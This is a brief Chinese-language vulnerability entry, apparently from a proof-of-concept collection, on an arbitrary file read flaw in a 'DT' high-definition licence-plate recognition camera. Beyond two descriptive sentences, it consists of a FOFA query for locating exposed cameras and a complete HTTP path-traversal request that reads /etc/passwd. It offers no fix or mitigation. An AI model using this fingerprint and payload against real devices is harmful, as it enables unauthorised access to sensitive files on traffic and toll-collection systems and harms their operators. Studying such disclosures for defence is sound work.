## DT高清车牌识别摄像机存在任意文件读取漏洞

DT高清车牌识别摄像机是一种高科技产品，主要用于抓拍和识别车牌信息，用于交通管理、违章抓拍、电子收费等目的。DT-高清车牌识别摄像机存在任意文件读取漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件。

## fofa

```
app="DT-高清车牌识别摄像机"
```

## poc

```
GET /../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

